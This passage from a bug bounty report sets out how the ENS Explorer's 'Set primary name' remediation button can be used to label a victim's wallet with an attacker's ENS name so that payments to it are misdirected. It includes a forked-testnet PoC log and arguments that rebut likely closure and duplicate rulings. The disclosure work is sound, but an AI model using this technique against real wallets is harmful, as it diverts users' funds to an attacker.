  victim primary name before : null
  row.reverseMatch           : mismatch
  OK   canSetPrimaryName: true
  OK   offerSetPrimary — red banner + "Set primary name" button rendered: true

=== 4. VICTIM clicks "Set primary name" — the exact tx AddressResolutionSidebar builds ===
  to  : 0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6 (ENSv1 ReverseRegistrar — getRegistrarAddress(60,"sepolia"))
  from: 0x0000000000000000000000000000000000001c11
  data: 0xc47f0027000000000000000000000000…   = setName("poc-primary-mtn98j01.eth")

=== 5. The ecosystem now labels the victim's wallet with the attacker's name ===
  OK   getEnsName(VICTIM) — ENSIP-3 forward-verified: poc-primary-mtn98j01.eth

=== 6. Attacker repoints the name at themselves ===
  OK   getEnsAddress(poc-primary-mtn98j01.eth): 0x00000000000000000000000000000000000a11Ac

=== 7. A THIRD PARTY PAYS THE NAME — executed on chain, not narrated ===
  THIRD_PARTY saw "VICTIM = poc-primary-mtn98j01.eth" in step 5 and pays that name
  the way every wallet does: resolve the name, then send to the result.
  getEnsAddress("poc-primary-mtn98j01.eth") -> 0x00000000000000000000000000000000000a11Ac
  attacker balance delta : 1 ETH
  victim   balance delta : 0 ETH
  OK   the payer sent to the ATTACKER: 0x00000000000000000000000000000000000a11Ac
  OK   ATTACKER received the funds: 1000000000000000000
  OK   VICTIM received nothing: 0

=== 8. Recovery enumeration — the STATE is revocable, the FUNDS are not ===
  victim setName("") -> getEnsName(VICTIM) = null
  attacker still holds   : 1 ETH
  OK   the payment is NOT clawed back by the revoke: 1000000000000000000

=== 9. Re-arming: one setAddr and the red banner is back ===
  OK   offerSetPrimary fires again: true

ALL ASSERTIONS PASSED
```

Scope of the demonstration

Stated up front rather than left to be found. None of these touch what the claim rests on.

* Part A is offline. It re-executes the predicate and request-builder logic transcribed verbatim from source with line references; it does not import the `.tsx` component, which needs a React render tree. The transcription is one-to-one and quoted above for line-by-line checking. Part B re-derives the same predicate from live chain state, so the two agree independently.
* Step 1 registers the name for real on the v2 `ensEthRegistrar` (`makeCommitment`, `commit`, `MIN_COMMITMENT_AGE`, `register`), paid in the deployment's USDC, which the harness mints to the attacker. Minting the fee is a harness convenience on a fork; the fee is 8.000021 USDC and an attacker simply pays it.
* The victim's wallet is impersonated with `anvil_impersonateAccount` rather than driven through the browser UI. What is not assumed is the app's behaviour: the `canSetPrimaryName` / `offerSetPrimary` predicate is recomputed in step 3 from live chain state using the source lines quoted above, and the transaction sent in step 4 is byte for byte the one `startSetPrimaryName` builds.
* No headless-browser capture. The rendered strings above are quoted from source (`AddressResolutionSidebar.tsx:129-136, 351, 355-359, 368-378, 597-611`), not screenshotted.
* The exact `L2ReverseRegistrar` authorization semantics for `setNameForAddr` on each of the five L2 testnets were not verified. Nothing in the claim rests on them: the claimed row is satisfied by the L1 `setName(string)` path alone, which is `msg.sender`-scoped and unconditional, and Part B exercises only that path. The L2 rows appear above solely as an observation about the absence of any confirmation surface there. Remove them from this report entirely and the finding is unchanged.

The victim's click is not listed here as a limitation, because it is not one. It is the mechanism, and the Impact section sets it out as such.

Preempting the likely closure arguments

The realized harm lands on an in-scope asset, the Explorer, not on a contract. Report #91306 was closed because "the realized harm is an account gaining or retaining a role at ROOT\_RESOURCE on the PermissionedResolver contract, with the role state itself sourced from the subgraph/indexer; both are excluded". That ground is not available here. The claimed row names a transaction, and this transaction is authored line by line inside `apps/portal`: the decision that one is warranted (`:454-458`), the decision to render it as a remediation (`:351`, `:368-378`), the target (`getRegistrarAddress(60, 'sepolia')`, `:532`), the ABI (`:538`), the function name (`:539`), and the argument `args: [name]` (`:540`, and `:551` on the Default row). Nothing in the claim requires a contract to misbehave: the `ReverseRegistrar` does exactly what it is specified to do, correctly, and so does the resolver and so does the registrar. The defect is that the Explorer tells the victim's wallet to tell the registrar something the victim did not intend. The complete remedy is a single predicate in `apps/portal`; no ENS contract, subgraph or metadata service is modified or needs to be.

The recovery works, and it does not cure the finding. Report #91838 was closed on "the victim can revoke the grant with a single call, which the report's own recovery steps confirm works". The equivalent call works here too. `ReverseRegistrar.setName("")` clears `addr.reverse`; step 8 of Part B executes it and asserts `getEnsName(VICTIM) = null`; it is reachable from this app on the victim's own reverse-resolution page. This is not permanent bricking and this report does not rest on one. It is still not a cure, for three reasons each executed rather than asserted. First, the funds are not recoverable even though the state is: step 8 runs the full revoke and then asserts the attacker still holds the 1 ETH, `the payment is NOT clawed back by the revoke: 1000000000000000000`. Second, no pre-existing authority is being preserved - #91838 turned on the grantee already holding equivalent power by another route, whereas here the attacker holds no prior relationship with the victim at all and before the click cannot cause the victim's address to reverse-resolve to anything. Third, the victim cannot prevent re-arming: step 9 shows one `setAddr` restoring the banner and the button, at roughly zero cost per iteration. Two residues the revoke does not touch: the victim's previous primary name is not restored automatically and nothing told them it was replaced, and on the five L2 rows there is no in-app revoke surface on this page at all.

The PoC does show a payer sending funds and losing them. Report #91837 was closed because its PoC "stops short of showing any payer actually sending funds". Step 7 of Part B is a real transaction: the payer resolves the name through the app's own UniversalResolver, sends 1 ETH to the address that resolution returns, and the run asserts on balances - `ATTACKER received the funds: 1000000000000000000` and `VICTIM received nothing: 0`.

And the harness is not standing in for the disputed step. Report #91314 was closed because "the USDC spend it measures is produced by the test harness itself driving the victim account through the renewal flow, not by demonstrating that a real user would be induced to select and approve payment for a name they don't own". The two harnesses do different jobs. In #91314 the harness stood in for the disputed step itself - inducement, a claim about human behaviour that a script cannot assert. In step 7 here the harness stands in only for the existence of a payer; what the payer then does is `getEnsAddress(name)` and then send to the result, with no branch and nothing a real user would decide differently. Every fact that determines where the ETH lands was already on chain and already printed before step 7 ran: step 5 printed `getEnsName(VICTIM)` and step 6 printed `getEnsAddress(...) -> 0x...a11Ac`. Step 7 executes an outcome those two assertions had already fixed. And step 7 is not where this report's impact lives: the violation is complete at step 5, when `apps/portal` submits the transaction. A reviewer who discounts step 7 in its entirety removes nothing from the claimed row.

The confirmation surface does not show the truth, and it would not matter if it did. This ground closed #91314 and #91306. It does not decide this report either way, because the claimed row does not require any displayed value to be incorrect. Taken on its own terms it still fails: the landing screen shows no name at all, the one screen that does show the name shows a string templated from the attacker's own route parameter rather than from an independent channel, the three facts that decide the outcome appear on no surface in the application, and five of the seven rows raise no confirmation modal whatsoever.

This is not an un-prompted action outside a normal workflow. Address Resolution is the first item in every name's sidebar nav, reachable in one click from the coin icons on any `/$name` profile (`CoinRecord.tsx:47-51`), and the button is the app's own prescribed remedy for a state it has just told the user is broken.

Not a duplicate

Against the prior submissions in this competition:

| Report                                                                          | Why this is not it                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| #89441 (`useReverseResolution.ts:236-241` `allowMismatch`)                      | That is the reverse-view page `/addr/$addr/reverse-resolution` mis-reporting an unverified record as verified - a read-path display bug in `apps/portal/src/features/reverse-resolution/`. This is the forward-view page `/$name/address` in `apps/portal/src/features/forward-resolution/`, and it is a write-path authorization bug. #89441's record never forward-verifies; here the record genuinely does verify, which is the whole point. Fixing `allowMismatch` leaves this fully live; fixing `canSetPrimaryName` leaves #89441 fully live. One symbol-level caution, since the two names are a character apart: #89441's secondary observation concerns `canSetAsPrimary`, a field on the reverse sidebar set `false` when a row inherits the ENSIP-19 default. This report concerns `canSetPrimaryName` at `AddressResolutionSidebar.tsx:454`. Neither identifier appears in the other's file. |
| #89441, on the underlying primitive                                             | #89441 also records that the L1 `ReverseRegistrar` is unauthenticated: `setName("vitalik.eth")` from an address owning nothing succeeds. That is true, this report relies on it, and it is not the root cause here. It is a property of an out-of-scope ENS contract behaving exactly as specified, and a correct caller works around it - which is precisely what the sibling `startSetAddr` gate does thirty lines away. The claim is that `apps/portal` decides to offer, builds, and submits that call from a wallet with no authority over the name.                                                                                                                                                                                                                                                                                                                                                |
| #91837 (Manager primary name, raw vs normalized)                                | Different app (`apps/manager`), different root cause (ENSIP-15 normalization of the claim string), different file, different fix line. There the victim owns the name they select and the app silently writes a different, normalized string; here the string written is exactly the string displayed and the defect is whose name it is. Fixing either leaves the other fully live.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| #91838 (migration carries a stale v1 controller forward as `ROLE_SET_RESOLVER`) | Different app, different subsystem (`packages/migration` plus the Manager migration flow), different primitive (a v2 role grant, not a reverse record), different victim precondition (owning an unreclaimed v1 name). No overlap.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| #89270 / #90161 / #90163 / #90190 (the raw-vs-normalized set)                   | None involve normalization. The name here is a canonical, correctly-rendered name; the defect is whose name it is.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| #91306 (`ResolverRolesSidebar` root sentinel)                                   | Different feature, different file.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| #91314 (`useV1NamesForAddress` `resolvedAddress` filter)                        | Closest in spirit, since it also exploits "an attacker can point their record at you". But its root cause is a missing ownership filter in a list query in `apps/portal/src/features/dashboard/`. The fix for #91314, adding `resolvedAddress: false`, does not touch `canSetPrimaryName`; the fix here does not touch the names list.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| #89279 / #89444 / #89445 / #89460 / #89462 / #90307                             | Entirely different subsystems: smart-account, workers, transaction-manager, migration.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |

Against the published Known Issues:

* EXP-INPUT-005 self-scopes to "homograph-style display confusion in our UI rather than incorrect resolution". No deceptive characters are involved here, and the resolution that results is incorrect and proven on chain.
* QA-06, a deleted non-resolving subname still shown as primary, is a stale display. Here the record is fresh, correct, and forward-verified.
* WEB-1257 / QA-01, primary name broken after a parent transfer, is a liveness defect with no attacker.
* WEB-1301, the address view showing metadata from the primary name, is what amplifies this finding rather than what covers it.
* R2-03 / R2-06, session key, are unrelated; this is a plain EOA write.
* SEC-TXM-002 / EXP-4337-002 / EXP-4337-003 are transaction-manager `from`, `chainId` and cached-address issues. Here `from`, `to` and `chainId` are all correct; the argument is the problem.
* The known-issues document states its audits "focused on application source directories" and were not exhaustive outside `transaction-manager` and `smart-account`. `features/forward-resolution/` appears nowhere in Part 1 or Part 2.

If an informational match to another submission is attached: the program page states, under Code Freeze Assurance, "Duplicates: Duplicate submissions of bugs are valid. Duplicate submissions of Insights are invalid." Three adjacent reports (#91837, #91838, #91306) were closed invalid with a match to an earlier submission attached and described as informational, while #90163 was matched and remained valid at capped severity. A finding cannot simultaneously be a match for an earlier submission of the same bug and invalid, under a program page that says duplicates are valid. If a match is found for this report, the outcome the program page provides for is valid as a duplicate, not invalid.
